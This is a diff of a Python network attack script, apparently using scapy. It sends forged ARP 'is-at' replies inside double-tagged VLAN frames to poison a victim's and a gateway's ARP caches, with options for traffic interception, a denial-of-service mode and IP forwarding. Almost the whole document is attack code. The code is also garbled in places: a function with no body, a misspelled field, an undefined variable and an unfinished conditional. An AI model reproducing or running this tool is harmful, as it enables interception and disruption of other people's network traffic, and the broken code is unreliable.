@@ -7,34 +7,49 @@ from uuid import getnode as get_mac
 def enable_forwarding():
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-#count is how many packets to count
-#filename is assumed to be valid
-#returns 1 when done
+def disable_forwarding():
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-def arp_spoof(victimIp,gateway, clientMac, yourIp):
-	pkt = ARP()
-	pkt.op="is-at"
-	pkt.pdst = gateway
-	pkt.src = yourIp
-	pkt.
-	send( Ether(dst=clientMac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
-	/ARP(op="who-has", psrc=gateway, pdst=victimIp),
+
+#pdst = packet destination
+#psrc = packet source
+#hwdst = hardware destination
+#hwsrc = your mac automatically (which allos you to recieve the packets)
+def arp_spoof(target_ip, gateway_ip):
+
+	target_pkt = ARP()
+	target_pkt.op = 'is-at'
+	target_pkt.pdst = target_ip
+	target_pkt.psrc = gateway_mac
+	target_pkt.hwdst = get_mac(target_ip)
+
+	gateway_pkt = ARP()
+	gateway_pkt.op = 'is-at'
+	gateway_pkt.psrc = target_ip
+	gateway_pkt.hwdst = get_mac(gateway_ip)
+	gateway_pkt.psdt = gateway_ip
+
+
+	print('[-] Sending arp packets. CTRL+C to exit')
+
+	send( Ether(dst=get_mac(target_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+	/target_pkt,
 	inter=RandNum(10,40), loop=1 )
 
-def arp_spoof(victimIp, victimMac, iface):
-	pkt = ARP()
-	pkt.op= 2
-	pkt.pdst=victimIp
-	pkt.hwdst=victimMac
-	pkt.src= socket.gethostbyname(socket.gethostname())
-	pkt.hwsrc = get_host_mac()
-	sendp(pkt,iface=iface, loop = 1)
+	send( Ether(dst=get_mac(gateway_ip))/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+	/gateway_pkt,
+	inter=RandNum(10,40), loop=1 )
 
-def getmac(interface):
-  try:
-    mac = open('/sys/class/net/'+interface+'/address').readline()
-  except:
-    mac = "00:00:00:00:00:00"
+
+def arp_dos(victimIp, gatewayIp):
+
+#taken from blackhat
+def get_mac(ip_address):
+	response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
+	  timeout=2, retry=10)
+	for s, r in response:
+	  return r[Ether].src
+	return None
 
   return mac[0:17]
 #calls function arp_monitor_callback
@@ -45,12 +60,19 @@ if __name__ == "__main__":
 		
 	#enable_forwarding()
 	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
-	parser.add_argument('-t', required=True, help= '[0] DOS, [1] Traffic Re-Routed to Source Ip')
-	parser.add_argument('-s', required=True, help= 'Ip address which recieves rerouted packets')
-	parser.add_argument('-v', '--victimIp', required=True, help= 'Set Victim Ip Address')
-	parser.add_argument('-g', '--gatewayIp',required=True,help= 'Set ip you want to impersonate')
-	parser.add_argument('-o', required = False, help = 'set type of arp packet. Defaut: is-at')
+	parser.add_argument('-t', required=False, dest ='type', help= '[0] Traffic Re-Routed to Source Ip. [1] DOS. Default [0]')
+	parser.add_argument('-v', '--victimIp', dest='victim', required=True, help= 'Set Victim Ip Address')
+	parser.add_argument('-g', '--gatewayIp', dest='gateway', required=True,help= 'Set ip you want to impersonate')
+	parser.add_argument('-f', dest='forward', required = False, help = '[1] Enable packet forwarding. Defaut: unenabled')
+
 	args = parser.parse_args()
+
+	if args.forward ==1:
+		enable_forwarding()
+
+	if args.type == 1:
+
+		
 
 
 
